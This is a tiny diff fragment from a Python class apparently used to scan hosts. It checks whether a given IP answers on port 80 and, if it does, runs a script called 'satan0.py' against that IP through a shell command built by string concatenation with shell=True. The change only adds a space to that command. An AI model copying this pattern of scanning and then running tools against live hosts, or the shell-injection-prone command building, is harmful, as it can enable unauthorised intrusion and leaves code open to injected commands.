@@ -87,7 +87,7 @@ class reverse:
             SOCK.settimeout(2)
             LIVE = SOCK.connect_ex((IP,80))
             if LIVE==0:
-                CMD  = exc + 'satan0.py ' + IP
+                CMD  = exc + ' satan0.py ' + IP
                 GO   = subprocess.check_output(CMD, shell=True, stderr=subprocess.STDOUT)
                 return 1, IP
             else:
